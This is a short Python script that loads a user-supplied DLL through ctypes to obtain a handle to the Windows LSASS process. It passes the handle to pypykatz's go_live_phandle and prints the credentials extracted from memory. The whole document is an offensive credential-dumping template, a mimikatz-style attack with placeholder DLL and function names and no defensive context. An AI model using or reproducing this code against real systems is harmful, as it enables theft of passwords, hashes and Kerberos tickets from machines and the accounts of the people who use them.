
from ctypes import *
from pypykatz.pypykatz import pypykatz

dll_path = ''

def get_lsass_handle():
	your_dll = windll.LoadLibrary(dll_path)
	_your_function = your_dll.your_function
	_your_function.argtypes = [] #I guess no args
	_your_function.restype  = c_void_p #this is basically a handle
	
	phandle = _your_function()

	return phandle


phandle = get_lsass_handle()
res = pypykatz.go_live_phandle(phandle)
print(str(res))
